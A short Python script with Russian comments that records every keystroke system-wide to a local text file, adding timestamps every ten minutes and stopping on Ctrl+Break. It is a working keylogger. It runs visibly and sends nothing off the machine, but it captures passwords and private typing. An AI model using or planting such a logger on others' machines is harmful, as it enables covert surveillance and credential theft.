import keyboard
import time
from datetime import datetime
import os
import threading

# specify the file name
filename = "C:/keypress/keylog.txt"

# Ensure directory exists
os.makedirs(os.path.dirname(filename), exist_ok=True)

def save_time_stamp(f):
    #Добавляет временную метку в файл
    f.write(f"\nСохранено в {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    f.flush()

def periodic_save(f, interval=600):
    #Сохраняем данные каждые interval секунд (по умолчанию 10 минут)
    while True:
        time.sleep(interval)  # Ждем 10 минут
        save_time_stamp(f)
        print(f"Автосохранение в {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def save_to_file():
    with open(filename, "a", encoding="utf-8") as f:
        # Запуск периодического сохранения в отдельном потоке
        save_thread = threading.Thread(target=periodic_save, args=(f,))
        save_thread.daemon = True
        save_thread.start()

        while True:
            try:
                # Ожидание нажатия клавиши
                key = keyboard.read_key()
                # Запись нажатия клавиши в файл
                f.write(f"{key} ")
                f.flush()  # Сброс буфера в файл
                # Задержка перед следующей проверкой
                time.sleep(0.1)
            except KeyboardInterrupt:
                # Добавляем временную метку при завершении программы
                save_time_stamp(f)
                print(f"Процесс остановлен. Файл сохранен в {filename}")
                break

# Добавляем глобальную горячую клавишу для завершения (Ctrl+Break)
keyboard.add_hotkey('ctrl+break', lambda: exit())

print("Начат процесс. Нажми Ctrl+Break для остановки.")
save_to_file()
